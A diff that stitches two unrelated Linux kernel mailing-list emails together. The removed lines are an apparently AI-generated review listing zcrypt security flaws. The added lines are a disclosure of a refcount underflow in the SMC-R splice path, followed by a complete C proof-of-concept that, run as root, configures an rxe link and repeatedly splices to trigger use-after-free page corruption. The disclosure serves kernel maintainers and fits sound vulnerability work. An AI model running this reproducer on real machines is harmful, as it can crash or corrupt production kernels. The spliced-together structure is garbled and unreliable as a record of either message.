@@ -1,181 +1,675 @@
-Received: from smtp.kernel.org (aws-us-west-2-korg-mail-alma10-1.taild15c8.ts.net [100.103.45.18])
-	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
+Received: from mail-pf1-f181.google.com (mail-pf1-f181.google.com [209.85.210.181])
+	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
 	(No client certificate requested)
-	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 383F838DC50
-	for <linux-s390@vger.kernel.org>; Thu, 30 Jul 2026 14:48:49 +0000 (UTC)
-Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=100.103.45.18
+	by smtp.subspace.kernel.org (Postfix) with ESMTPS id D8754443AA7
+	for <linux-s390@vger.kernel.org>; Thu, 30 Jul 2026 14:56:05 +0000 (UTC)
+Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=209.85.210.181
 ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
-	t=1785422930; cv=none; b=XYHkneVcGQT2lXyg1Lm+yhBU/nlQtQ0BzgWcddshI/XkT8ZlDJQ469MTzqCCc7IkEoZeNB+dMWL+f2c9JVmr9MMcJwFluLAwvvuLB6VsHnJBeiCufFcsZ37SRpXW2mp7j8pwqfwRHb62g0HZw0IgFfaGOXtWhEFyhDDCRD5lep8=
+	t=1785423368; cv=none; b=qFCPTaWte3zSIoRj6vugxIa84+HOhUBNOfWDwPCD48sU3s4KjkOQL3EbMGnPE7wBIVV6dWTW9gP29s6j42hpeJR0eAeWKrg3JkTpOSiVGEsXPH4+D9CQoo1U1Fk2esgUOjpWcgOQj8+x4AKagkgU+gg8J3EV9a24S/AaRRcdebc=
 ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
-	s=arc-20240116; t=1785422930; c=relaxed/simple;
-	bh=TmeKDnfp1qhT4HJvBAEe24+nUzyoXUP25uCHD8DR0oE=;
-	h=From:Subject:To:Cc:In-Reply-To:References:Content-Type:Date:
-	 Message-Id; b=g0xkMUyM31vsHakQPR8HRigI7RpdJCF7hWT3lzQlAfNvrSm0y0bJbk+mJFcCj6BQDj43cx+Dl4SzFgfY5GJhgMK+nfZttQpyZK2Ky3spH2AT+UO7w31nYARlh0WQos8Rv4IDsx6omwEqL9v6v75NZwX4ENSMtabyshjPaJW5zc8=
-ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dkim=pass (2048-bit key) header.d=kernel.org header.i=@kernel.org header.b=MF3YRtfV; arc=none smtp.client-ip=100.103.45.18
+	s=arc-20240116; t=1785423368; c=relaxed/simple;
+	bh=kp+qcaXg3CDUZUSkLKvx5bcoy107QHVvcNaQ18gelmM=;
+	h=From:To:Cc:Subject:Date:Message-ID:MIME-Version; b=XGOOnzpSq6LPQA1emP5I5YvUAGwX2LS5+AfQkwyu3vXrGL5JAATMFvgH+ticBNxP8D4x0Tmyfg6NeCf2tSMm7TZKr+/tI0o3nd7pL5eCMDQIFsAk8ro2EJHkcZZy+MEqTN7v0zZYK2kzWbjGW+2Jd/vwOkIbVYd/TKSjC5tfciw=
+ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com; spf=pass smtp.mailfrom=gmail.com; dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b=DjCUGfCc; arc=none smtp.client-ip=209.85.210.181
+Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com
+Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=gmail.com
 Authentication-Results: smtp.subspace.kernel.org;
-	dkim=pass (2048-bit key) header.d=kernel.org header.i=@kernel.org header.b="MF3YRtfV"
-Received: by smtp.kernel.org (Postfix) with ESMTPSA id AF66F1F000E9;
-	Thu, 30 Jul 2026 14:48:48 +0000 (UTC)
-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=kernel.org;
-	s=k20260515; t=1785422929;
-	bh=7+Qwis1LA98xdPcY0/2fyJVyiHrA7zWrM14OjtliKQI=;
-	h=From:Subject:Reply-To:To:Cc:In-Reply-To:References:Date;
-	b=MF3YRtfVxDVN8lOKOv7e6W+iJXWzSccHxaA1BzRhZUUkAKLPRfDzviXLc6JIdLtN2
-	 yAoBt0McsAE+dfvFT2DiKyPBOYLYBkbdnFKty/VHreTR6mxfYWazOzQnhheq/ZcOp9
-	 ml7EIcf0dl/gGbHkGZ4F69D24lKBoqK0QZT4Rprj04vbvrHsFpTwk/r057jdd2D7CN
-	 1yEQRKCNkdFEjTqNVBARaMIHIshmxMoy081Gr9R/bwaCmbJ6RSGuXJW3Wd4ItwLhri
-	 8pLCadZwRaCMdl+AMtcbWNi+0OlV1UtiOXlEzG879s4qOarBlM6QjmeEgnIAcJUwZT
-	 NiKVVdcRblMKQ==
-From: sashiko-bot@kernel.org
-Subject: Re: [PATCH v10 2/5] s390/zcrypt: Improve CCA CPRB length and
- overflow checks
-Reply-To: sashiko-reviews@lists.linux.dev
-To: "Harald Freudenberger" <freude@linux.ibm.com>
-Cc: "Heiko Carstens" <hca@linux.ibm.com>, "Vasily Gorbik" <gor@linux.ibm.com>, "Alexander
- Gordeev" <agordeev@linux.ibm.com>, linux-s390@vger.kernel.org
-In-Reply-To: <20260730141509.205970-3-freude@linux.ibm.com>
-References: <20260730141509.205970-1-freude@linux.ibm.com>
- <20260730141509.205970-3-freude@linux.ibm.com>
-Content-Type: text/plain; charset=utf-8
-Content-Transfer-Encoding: quoted-printable
-Date: Thu, 30 Jul 2026 14:48:48 +0000
-Message-Id: <20260730144848.AF66F1F000E9@smtp.kernel.org>
+	dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b="DjCUGfCc"
+Received: by mail-pf1-f181.google.com with SMTP id d2e1a72fcca58-8484f229529so1639075b3a.2
+        for <linux-s390@vger.kernel.org>; Thu, 30 Jul 2026 07:56:05 -0700 (PDT)
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
+        d=gmail.com; s=20251104; t=1785423365; x=1786028165; darn=vger.kernel.org;
+        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
+         :to:from:from:to:cc:subject:date:message-id:reply-to:content-type;
+        bh=VD/owNpsspCzbNl6molRF9pmQ1ESlFG2whVtOJR4zgE=;
+        b=DjCUGfCc0lVhhPnJGK9AUUJtoAAe3bfa0h1wGWMaxPWZuefHw8pVZyq0TuuE/GZih7
+         5gB+6db1iY4db28z/alvgH81pjPzRV7raIfIXmm03Ly/0M92klgWAh4YexqYuGMCy88Z
+         kb24kbKEuzFl/fzuu3DnkNuL4dLKf04LN6ffRfX94mCnF8iLA308ZYeC7FY0lttMZse+
+         LYU+7noy4nEg/8XEjvAC6s0Cxkuo5m/N6//zPHUD3N035yDd+G+051kox+2f268FQbpV
+         8c+hT+2jKfQjT5A3qq9jlzQOSKnl7DO5KfSka1rvHLEGo6pvXyhUdH2rTVCoe62jos63
+         V8/w==
+X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
+        d=1e100.net; s=20251104; t=1785423365; x=1786028165;
+        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
+         :to:from:x-gm-gg:x-gm-message-state:from:to:cc:subject:date
+         :message-id:reply-to:content-type;
+        bh=VD/owNpsspCzbNl6molRF9pmQ1ESlFG2whVtOJR4zgE=;
+        b=f3Ia2FuKsgtSEddAfpyqVwF1n33T904EV656h41NXa1cSzNKmzANq/z3ehVLJfbsQx
+         dgo3gEXwxpd6CcXYfoWcxRsPUYo1BwfmctX2SwFvuWqtN36hGx8fY4fWjaw2EVCGCmUT
+         as5zNtIJcNj76C3inh7KIB/Rgs+wLxbbCM9j3IIunGRzx9UUgHdnC7NHbVFKMDNlXEi0
+         c+ibBweLqmVul+GrcnQhp9K5Hgrd0TE29HzpAk4s4xMhZiV7cmcQK5+mNdHFsGq5W3n6
+         Sz6Wckt+ZfzLIIw0snlKj07NAvuqnK6SkJfWAgko7u7qUqu/KzoUUS2woFoAeH04Rofp
+         O8oA==
+X-Forwarded-Encrypted: i=1; AHgh+RqeYPigMAydEET1o+EXRV8bJkOMOvoU9tbInuPYImux2LdujGsOozCTzTS249xOT71mFb3EOTZTR0ZL@vger.kernel.org
+X-Gm-Message-State: AOJu0YzCeEIxooF/eQZqmgQI/LcqQTuMKUUgmRrhJ6Grx9UuPWMQA7rp
+	Jarzn8caYWS6WXOfHAaqAm6A0Awf8edfX5XccJXGvjIkqXt0LWDx+Pac
+X-Gm-Gg: AR+sD12j1u/0gR7usonelIZd0DEIHKSTaGdyJqSiRP91Dsew8KMl9Zvf5zW4L45ae1h
+	OfH9owN3+NKt8LdgqvRddCAHiIgqZdOcW1bvIxsRaXHb+oYab+6A8ici7isgb3uSr3VnCfnzp8k
+	NquAw5bYsQXv1vgnjySOVrMgbxXqaxg1YD0I04MdQBfPwvFwP+HZhxeM8cY7L4b+EUpRQZjjvuI
+	dylh3W+ia9rNP9MZcq7kJw4PjEcay4xpk7zXgYdpR/B5lXGxNq9v/xqC9khq0IQMNPbM4Uw++k4
+	nL6AGUhTNZQWROQ1w0l4/j5nwVoDUKY00h+bns8qUbMfV1Yv30D6u4InxRiAaytr2FI1ky0BtyS
+	A57tAx7m3yp73WYp7FhSuOAqN+BQw2NN6Q3fvwNS5Obwnde59ZnVRIsBbWStEz+7aSA8ycmxO4s
+	usUvGrekJCryAcQKHM+2soWxcAD6dbER2KvyHfR5GiEzzPCxGBz56TWuyQNR/O//2swhXjzegi2
+	snU
+X-Received: by 2002:a05:6a00:3e20:b0:846:f517:ba5a with SMTP id d2e1a72fcca58-84ebc239cddmr2771943b3a.28.1785423365026;
+        Thu, 30 Jul 2026 07:56:05 -0700 (PDT)
+Received: from enjou-Legion-Y7000P-2019 ([165.232.167.5])
+        by smtp.gmail.com with ESMTPSA id 41be03b00d2f7-cbdb78ae98asm2265960a12.1.2026.07.30.07.55.57
+        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
+        Thu, 30 Jul 2026 07:56:04 -0700 (PDT)
+From: Ren Wei <enjou1224z@gmail.com>
+To: linux-rdma@vger.kernel.org,
+	linux-s390@vger.kernel.org,
+	netdev@vger.kernel.org
+Cc: alibuda@linux.alibaba.com,
+	dust.li@linux.alibaba.com,
+	sidraya@linux.ibm.com,
+	mjambigi@linux.ibm.com,
+	tonylu@linux.alibaba.com,
+	guwen@linux.alibaba.com,
+	davem@davemloft.net,
+	edumazet@google.com,
+	kuba@kernel.org,
+	pabeni@redhat.com,
+	horms@kernel.org,
+	ubraun@linux.ibm.com,
+	stefan.raspl@linux.ibm.com,
+	vega@nebusec.ai,
+	lx24@stu.ynu.edu.cn,
+	d4n.for.sec@gmail.com,
+	enjou1224z@gmail.com
+Subject: [PATCH net v2 0/1] net: smc: smc_rx_splice() can underflow VM page refcounts
+Date: Thu, 30 Jul 2026 22:55:51 +0800
+Message-ID: <20260730145552.360287-1-enjou1224z@gmail.com>
+X-Mailer: git-send-email 2.51.0
 Precedence: bulk
 X-Mailing-List: linux-s390@vger.kernel.org
 List-Id: <linux-s390.vger.kernel.org>
 List-Subscribe: <mailto:linux-s390+subscribe@vger.kernel.org>
 List-Unsubscribe: <mailto:linux-s390+unsubscribe@vger.kernel.org>
+MIME-Version: 1.0
+Content-Transfer-Encoding: 8bit
 
-Thank you for your contribution! Sashiko AI review found 4 potential issue(=
-s) to consider:
+From: Daming Li <d4n.for.sec@gmail.com>
 
-New issues:
-- [Medium] Uninitialized alignment padding bytes may be read during functio=
-n code extraction in `xcrb_msg_to_type6cprb_msgx`.
+From: Daming Li <d4n.for.sec@gmail.com>
 
-Pre-existing issues:
-- [Critical] A 64-bit integer overflow in `xcrb_msg_to_type6_ep11cprb_msgx`=
- allows a massive `req_len` to bypass the buffer size check.
-- [High] The EP11 request path lacks minimum size validation, leading to un=
-initialized kernel memory access.
-- [High] A user can bypass administrative domain permission checks by setti=
-ng the target domain to AUTOSEL_DOM (0xFFFF).
---
+Bug details:
 
---- Patch [2]: [PATCH v10 2/5] s390/zcrypt: Improve CCA CPRB length and ove=
-rflow checks ---
-commit 168ea93b9d93d40b4d0625f5a9d932544117496a
-Author: Harald Freudenberger <freude@linux.ibm.com>
+The bug is in the VM-backed SMC-R splice path in
+`smc_rx_splice()`. It builds a multi-page `splice_pipe_desc` and hands
+it to `splice_to_pipe()`, but it does not take page references for all
+candidate pages before doing so.
 
-s390/zcrypt: Improve CCA CPRB length and overflow checks
-   =20
-This patch improves input validation in the xcrb_msg_to_type6cprb_msgx
-function. It uses size_t for length calculations, adds bounds checks after
-alignment, validates the minimum control block size, and detects overflow
-in sum calculations.
+That breaks the splice ownership contract. Pages that are not queued are
+released through `smc_rx_spd_release()`, while queued pages are later
+released through `smc_rx_pipe_buf_release()`. In the VM-backed path, the
+code instead tries to take page references only after `splice_to_pipe()`
+returns, and it derives the number of queued pages from a mutated
+`offset` value.
 
-> diff --git a/drivers/s390/crypto/zcrypt_msgtype6.c b/drivers/s390/crypto/=
-zcrypt_msgtype6.c
-> --- a/drivers/s390/crypto/zcrypt_msgtype6.c
-> +++ b/drivers/s390/crypto/zcrypt_msgtype6.c
+As a result, unqueued pages can see a bare `put_page()`, and queued VM
+pages can be under-accounted as well. This can underflow page refcounts
+on RMB backing pages and lead to use-after-free or double-free-style
+page lifecycle corruption, with the crash later surfacing in the SMC-R
+or RDMA data path.
 
-[ ... ]
+Reproducer:
 
-> @@ -404,8 +395,8 @@ static int xcrb_msg_to_type6cprb_msgx(bool userspace,=
- struct ap_message *ap_msg,
->  			     xcrb->request_control_blk_addr,
->  			     xcrb->request_control_blk_length))
->  		return -EFAULT;
-> -	if (msg->cprbx.cprb_len + sizeof(msg->hdr.function_code) >
-> -	    xcrb->request_control_blk_length)
-> +	/* copy subfunction code into AP msg type 6 function code field */
-> +	if (msg->cprbx.cprb_len > req_cblen - sizeof(msg->hdr.function_code))
-
-[Severity: Medium]
-Can this relaxed bounds check result in reading uninitialized alignment
-padding?
-
-If a userspace caller sends a CCA ioctl where
-xcrb->request_control_blk_length is not a multiple of 4 (for example, 21),
-the z_copy_from_user() call copies exactly 21 bytes. Up to 3 bytes of
-padding might be left uninitialized.
-
-Because the check now compares against req_cblen instead of
-xcrb->request_control_blk_length, could a crafted cprbx.cprb_len (e.g., 22)
-pass this validation and point into the uninitialized padding area, allowing
-the subsequent memcpy() to read uninitialized kernel heap memory into
-msg->hdr.function_code?
-
->  		return -EINVAL;
->  	function_code =3D ((unsigned char *)&msg->cprbx) + msg->cprbx.cprb_len;
->  	memcpy(msg->hdr.function_code, function_code,
-
-[ ... ]
+cc -O2 -pthread -Wall -Wextra -o mini_poc mini_poc.c
+./mini_poc
 
 
-While reviewing these length check improvements, I also noticed a few
-pre-existing issues in related code:
+We run the PoC in a 2 vCPU, 2 GB RAM x86 QEMU environment.
+
+------BEGIN poc.c------
+
+#define _GNU_SOURCE
+#include <arpa/inet.h>
+#include <errno.h>
+#include <fcntl.h>
+#include <linux/genetlink.h>
+#include <linux/netlink.h>
+#include <linux/smc.h>
+#include <netinet/in.h>
+#include <pthread.h>
+#include <stdint.h>
+#include <stdbool.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <sys/socket.h>
+#include <sys/wait.h>
+#include <unistd.h>
+
+#ifndef AF_SMC
+#define AF_SMC 43
+#endif
+
+#ifndef SMC_GENL_FAMILY_NAME
+#define SMC_GENL_FAMILY_NAME "SMC_GEN_NETLINK"
+#endif
+#ifndef SMC_GENL_FAMILY_VERSION
+#define SMC_GENL_FAMILY_VERSION 1
+#endif
+#ifndef SMC_MAX_EID_LEN
+#define SMC_MAX_EID_LEN 32
+#endif
+#ifndef SMC_NETLINK_ADD_UEID
+#define SMC_NETLINK_ADD_UEID 10
+#endif
+#ifndef SMC_NLA_EID_TABLE_ENTRY
+#define SMC_NLA_EID_TABLE_ENTRY 1
+#endif
+
+#define PNET_FAMILY_NAME "SMC_PNETID"
+#define PNET_FAMILY_VERSION 1
+#define PNET_CMD_ADD 2
+#define PNET_A_NAME 1
+#define PNET_A_ETHNAME 2
+#define PNET_A_IBNAME 3
+#define PNET_A_IBPORT 4
+
+#ifndef NLA_ALIGNTO
+#define NLA_ALIGNTO 4
+#endif
+#ifndef NLA_ALIGN
+#define NLA_ALIGN(len) (((len) + NLA_ALIGNTO - 1) & ~(NLA_ALIGNTO - 1))
+#endif
+#ifndef NLA_HDRLEN
+#define NLA_HDRLEN ((int)NLA_ALIGN(sizeof(struct nlattr)))
+#endif
+#ifndef NLA_DATA
+#define NLA_DATA(nla) ((void *)((char *)(nla) + NLA_HDRLEN))
+#endif
+#ifndef NLA_NEXT
+#define NLA_NEXT(nla, attrlen) ((attrlen) -= NLA_ALIGN((nla)->nla_len), \
+				(struct nlattr *)(((char *)(nla)) + NLA_ALIGN((nla)->nla_len)))
+#endif
+#ifndef NLA_OK
+#define NLA_OK(nla, len) ((len) >= (int)sizeof(struct nlattr) && \
+			  (nla)->nla_len >= sizeof(struct nlattr) && \
+			  (nla)->nla_len <= (len))
+#endif
+#ifndef NLA_TYPE_MASK
+#define NLA_TYPE_MASK 0x3fff
+#endif
+
+static volatile int server_ready;
+static volatile int stop_server;
+static int g_port = 27555;
+
+static void die(const char *msg)
+{
+	perror(msg);
+	exit(1);
+}
+
+static int run_cmd(const char *cmd)
+{
+	int status = system(cmd);
+
+	if (status == -1)
+		return -1;
+	if (!WIFEXITED(status))
+		return -1;
+	return WEXITSTATUS(status);
+}
+
+static int write_file(const char *path, const char *value)
+{
+	int fd = open(path, O_WRONLY);
+	ssize_t len = strlen(value);
+
+	if (fd < 0)
+		return -1;
+	if (write(fd, value, len) != len) {
+		close(fd);
+		return -1;
+	}
+	close(fd);
+	return 0;
+}
+
+static int add_attr(struct nlmsghdr *nlh, size_t maxlen, uint16_t type,
+		    const void *data, size_t len)
+{
+	size_t total = NLA_ALIGN(sizeof(struct nlattr) + len);
+	struct nlattr *nla;
+
+	if (NLMSG_ALIGN(nlh->nlmsg_len) + total > maxlen)
+		return -1;
+
+	nla = (struct nlattr *)((char *)nlh + NLMSG_ALIGN(nlh->nlmsg_len));
+	nla->nla_type = type;
+	nla->nla_len = sizeof(struct nlattr) + len;
+	memcpy((char *)nla + sizeof(struct nlattr), data, len);
+	memset((char *)nla + nla->nla_len, 0, total - nla->nla_len);
+	nlh->nlmsg_len = NLMSG_ALIGN(nlh->nlmsg_len) + total;
+	return 0;
+}
+
+static int resolve_family_id(int fd, const char *name)
+{
+	char buf[1024] = {0};
+	char rbuf[8192];
+	struct nlmsghdr *nlh = (struct nlmsghdr *)buf;
+	struct genlmsghdr *gh = (struct genlmsghdr *)(nlh + 1);
+	struct sockaddr_nl sa = { .nl_family = AF_NETLINK };
+	struct iovec iov = { .iov_base = nlh, .iov_len = 0 };
+	struct msghdr msg = {
+		.msg_name = &sa,
+		.msg_namelen = sizeof(sa),
+		.msg_iov = &iov,
+		.msg_iovlen = 1,
+	};
+	struct iovec riov = { .iov_base = rbuf, .iov_len = sizeof(rbuf) };
+	struct msghdr rmsg = {
+		.msg_name = &sa,
+		.msg_namelen = sizeof(sa),
+		.msg_iov = &riov,
+		.msg_iovlen = 1,
+	};
+	ssize_t len;
+
+	nlh->nlmsg_len = NLMSG_LENGTH(sizeof(*gh));
+	nlh->nlmsg_type = GENL_ID_CTRL;
+	nlh->nlmsg_flags = NLM_F_REQUEST;
+	nlh->nlmsg_seq = 1;
+	gh->cmd = CTRL_CMD_GETFAMILY;
+	gh->version = 1;
+
+	if (add_attr(nlh, sizeof(buf), CTRL_ATTR_FAMILY_NAME,
+		     name, strlen(name) + 1) < 0)
+		return -1;
+
+	iov.iov_len = nlh->nlmsg_len;
+	if (sendmsg(fd, &msg, 0) < 0)
+		return -1;
+
+	len = recvmsg(fd, &rmsg, 0);
+	if (len < 0)
+		return -1;
+
+	for (struct nlmsghdr *nh = (struct nlmsghdr *)rbuf;
+	     NLMSG_OK(nh, (unsigned int)len);
+	     nh = NLMSG_NEXT(nh, len)) {
+		if (nh->nlmsg_type == NLMSG_ERROR)
+			return -1;
+		if (nh->nlmsg_type != GENL_ID_CTRL)
+			continue;
+
+		struct genlmsghdr *g = NLMSG_DATA(nh);
+		int rem = nh->nlmsg_len - NLMSG_LENGTH(sizeof(*g));
+		struct nlattr *a = (struct nlattr *)((char *)g + sizeof(*g));
+
+		for (; NLA_OK(a, rem); a = NLA_NEXT(a, rem)) {
+			if ((a->nla_type & NLA_TYPE_MASK) == CTRL_ATTR_FAMILY_ID)
+				return *(uint16_t *)NLA_DATA(a);
+		}
+	}
+
+	errno = ENOENT;
+	return -1;
+}
+
+static int send_and_wait_ack(int fd, struct nlmsghdr *nlh)
+{
+	struct sockaddr_nl sa = { .nl_family = AF_NETLINK };
+	struct iovec iov = { .iov_base = nlh, .iov_len = nlh->nlmsg_len };
+	struct msghdr msg = {
+		.msg_name = &sa,
+		.msg_namelen = sizeof(sa),
+		.msg_iov = &iov,
+		.msg_iovlen = 1,
+	};
+
+	if (sendmsg(fd, &msg, 0) < 0)
+		return -1;
+
+	for (;;) {
+		char rbuf[8192];
+		struct iovec riov = { .iov_base = rbuf, .iov_len = sizeof(rbuf) };
+		struct msghdr rmsg = {
+			.msg_name = &sa,
+			.msg_namelen = sizeof(sa),
+			.msg_iov = &riov,
+			.msg_iovlen = 1,
+		};
+		ssize_t len = recvmsg(fd, &rmsg, 0);
+
+		if (len < 0)
+			return -1;
+
+		for (struct nlmsghdr *nh = (struct nlmsghdr *)rbuf;
+		     NLMSG_OK(nh, (unsigned int)len);
+		     nh = NLMSG_NEXT(nh, len)) {
+			if (nh->nlmsg_seq != nlh->nlmsg_seq)
+				continue;
+			if (nh->nlmsg_type == NLMSG_ERROR) {
+				struct nlmsgerr *e = NLMSG_DATA(nh);
+
+				if (e->error == 0)
+					return 0;
+				errno = -e->error;
+				return -1;
+			}
+			if (nh->nlmsg_type == NLMSG_DONE)
+				return 0;
+		}
+	}
+}
+
+static int add_pnet_mapping(void)
+{
+	char buf[1024] = {0};
+	struct nlmsghdr *nlh = (struct nlmsghdr *)buf;
+	struct genlmsghdr *gh = (struct genlmsghdr *)(nlh + 1);
+	uint8_t port = 1;
+	int fd, fam, ret;
+
+	fd = socket(AF_NETLINK, SOCK_RAW, NETLINK_GENERIC);
+	if (fd < 0)
+		return -1;
+
+	fam = resolve_family_id(fd, PNET_FAMILY_NAME);
+	if (fam < 0) {
+		close(fd);
+		return -1;
+	}
+
+	nlh->nlmsg_len = NLMSG_LENGTH(sizeof(*gh));
+	nlh->nlmsg_type = fam;
+	nlh->nlmsg_flags = NLM_F_REQUEST | NLM_F_ACK;
+	nlh->nlmsg_seq = 101;
+	gh->cmd = PNET_CMD_ADD;
+	gh->version = PNET_FAMILY_VERSION;
+
+	if (add_attr(nlh, sizeof(buf), PNET_A_NAME, "PNETLO", 7) < 0 ||
+	    add_attr(nlh, sizeof(buf), PNET_A_ETHNAME, "lo", 3) < 0 ||
+	    add_attr(nlh, sizeof(buf), PNET_A_IBNAME, "rxe_lo", 7) < 0 ||
+	    add_attr(nlh, sizeof(buf), PNET_A_IBPORT, &port, sizeof(port)) < 0) {
+		close(fd);
+		errno = EMSGSIZE;
+		return -1;
+	}
+
+	ret = send_and_wait_ack(fd, nlh);
+	close(fd);
+	return ret;
+}
+
+static int add_ueid(void)
+{
+	char buf[1024] = {0};
+	struct nlmsghdr *nlh = (struct nlmsghdr *)buf;
+	struct genlmsghdr *gh = (struct genlmsghdr *)(nlh + 1);
+	int fd, fam, ret;
+	static const char ueid[SMC_MAX_EID_LEN + 1] =
+		"ABCDEFGHIJKLMNOPQRSTUVWX12345678";
+
+	fd = socket(AF_NETLINK, SOCK_RAW, NETLINK_GENERIC);
+	if (fd < 0)
+		return -1;
+
+	fam = resolve_family_id(fd, SMC_GENL_FAMILY_NAME);
+	if (fam < 0) {
+		close(fd);
+		return -1;
+	}
+
+	nlh->nlmsg_len = NLMSG_LENGTH(sizeof(*gh));
+	nlh->nlmsg_type = fam;
+	nlh->nlmsg_flags = NLM_F_REQUEST | NLM_F_ACK;
+	nlh->nlmsg_seq = 102;
+	gh->cmd = SMC_NETLINK_ADD_UEID;
+	gh->version = SMC_GENL_FAMILY_VERSION;
+
+	if (add_attr(nlh, sizeof(buf), SMC_NLA_EID_TABLE_ENTRY,
+		     ueid, sizeof(ueid)) < 0) {
+		close(fd);
+		errno = EMSGSIZE;
+		return -1;
+	}
+
+	ret = send_and_wait_ack(fd, nlh);
+	close(fd);
+	return ret;
+}
+
+static void drain_pipe(int rfd)
+{
+	char tmp[8192];
+
+	for (;;) {
+		ssize_t n = read(rfd, tmp, sizeof(tmp));
+
+		if (n <= 0)
+			break;
+	}
+}
+
+static void *server_thread(void *arg)
+{
+	int ls;
+	int one = 1;
+	struct sockaddr_in addr;
+	static char payload[65536];
+
+	(void)arg;
+
+	ls = socket(AF_SMC, SOCK_STREAM, 0);
+	if (ls < 0)
+		die("server socket(AF_SMC)");
+
+	if (setsockopt(ls, SOL_SOCKET, SO_REUSEADDR, &one, sizeof(one)) < 0)
+		die("setsockopt(SO_REUSEADDR)");
+
+	memset(&addr, 0, sizeof(addr));
+	addr.sin_family = AF_INET;
+	addr.sin_port = htons(g_port);
+	if (inet_pton(AF_INET, "127.0.0.1", &addr.sin_addr) != 1)
+		die("inet_pton");
+
+	if (bind(ls, (struct sockaddr *)&addr, sizeof(addr)) < 0)
+		die("bind");
+	if (listen(ls, 64) < 0)
+		die("listen");
+
+	memset(payload, 'R', sizeof(payload));
+	__atomic_store_n(&server_ready, 1, __ATOMIC_RELEASE);
+
+	while (!__atomic_load_n(&stop_server, __ATOMIC_ACQUIRE)) {
+		int cs = accept(ls, NULL, NULL);
+
+		if (cs < 0) {
+			if (errno == EINTR)
+				continue;
+			break;
+		}
+
+		while (!__atomic_load_n(&stop_server, __ATOMIC_ACQUIRE)) {
+			ssize_t n = send(cs, payload, sizeof(payload), 0);
+
+			if (n < 0)
+				break;
+		}
+
+		close(cs);
+	}
+
+	close(ls);
+	return NULL;
+}
+
+static void run_round(int round)
+{
+	struct sockaddr_in addr;
+	int s, p[2], flags;
+	char first;
+	char fill[4096];
+	int i;
+
+	s = socket(AF_SMC, SOCK_STREAM, 0);
+	if (s < 0)
+		die("client socket(AF_SMC)");
+
+	memset(&addr, 0, sizeof(addr));
+	addr.sin_family = AF_INET;
+	addr.sin_port = htons(g_port);
+	if (inet_pton(AF_INET, "127.0.0.1", &addr.sin_addr) != 1)
+		die("inet_pton");
+
+	if (connect(s, (struct sockaddr *)&addr, sizeof(addr)) < 0)
+		die("connect");
+	if (recv(s, &first, 1, 0) != 1)
+		die("recv first byte");
+	if (pipe(p) < 0)
+		die("pipe");
+	if (fcntl(p[1], F_SETPIPE_SZ, 8192) < 0)
+		die("F_SETPIPE_SZ");
+
+	flags = fcntl(p[0], F_GETFL, 0);
+	if (flags < 0)
+		die("fcntl(F_GETFL, read)");
+	if (fcntl(p[0], F_SETFL, flags | O_NONBLOCK) < 0)
+		die("fcntl(F_SETFL, read)");
+
+	flags = fcntl(p[1], F_GETFL, 0);
+	if (flags < 0)
+		die("fcntl(F_GETFL, write)");
+	if (fcntl(p[1], F_SETFL, flags | O_NONBLOCK) < 0)
+		die("fcntl(F_SETFL, write)");
+
+	memset(fill, 0x42, sizeof(fill));
+	for (i = 0; i < 20000; i++) {
+		ssize_t n;
+
+		drain_pipe(p[0]);
+		if (write(p[1], fill, sizeof(fill)) != (ssize_t)sizeof(fill))
+			die("prefill write");
+
+		n = splice(s, NULL, p[1], NULL, 65535,
+			   SPLICE_F_NONBLOCK | SPLICE_F_MOVE);
+		if (n < 0 && errno != EAGAIN && errno != EFAULT)
+			die("splice");
+	}
+
+	close(p[0]);
+	close(p[1]);
+	close(s);
+
+	if ((round % 5) == 0)
+		fprintf(stderr, "round=%d done\n", round);
+}
+
+static void setup_runtime(void)
+{
+	if (geteuid() != 0) {
+		fprintf(stderr, "run as root\n");
+		exit(1);
+	}
+
+	if (run_cmd("rdma link add rxe_lo type rxe netdev lo >/dev/null 2>&1") != 0)
+		die("rdma link add rxe_lo");
+	if (add_pnet_mapping() < 0)
+		die("add_pnet_mapping");
+	if (add_ueid() < 0)
+		die("add_ueid");
+	if (write_file("/proc/sys/net/smc/smcr_buf_type", "2\n") < 0)
+		die("write smcr_buf_type");
+}
+
+int main(void)
+{
+	pthread_t th;
+	int r;
+
+	setup_runtime();
+
+	if (pthread_create(&th, NULL, server_thread, NULL)) {
+		fprintf(stderr, "pthread_create failed\n");
+		return 1;
+	}
+
+	while (!__atomic_load_n(&server_ready, __ATOMIC_ACQUIRE))
+		usleep(1000);
+
+	for (r = 0; r < 200; r++)
+		run_round(r);
+
+	__atomic_store_n(&stop_server, 1, __ATOMIC_RELEASE);
+
+	/* Unblock accept so server thread can exit cleanly if no panic happened. */
+	{
+		int s = socket(AF_SMC, SOCK_STREAM, 0);
+
+		if (s >= 0) {
+			struct sockaddr_in addr;
+
+			memset(&addr, 0, sizeof(addr));
+			addr.sin_family = AF_INET;
+			addr.sin_port = htons(g_port);
+			inet_pton(AF_INET, "127.0.0.1", &addr.sin_addr);
+			connect(s, (struct sockaddr *)&addr, sizeof(addr));
+			close(s);
+		}
+	}
+
+	pthread_join(th, NULL);
+	return 0;
+}
 
 
-[Severity: Critical]
-This isn't a bug introduced by this patch, but does
-xcrb_msg_to_type6_ep11cprb_msgx() suffer from a similar 64-bit integer
-overflow?
+------END poc.c--------
 
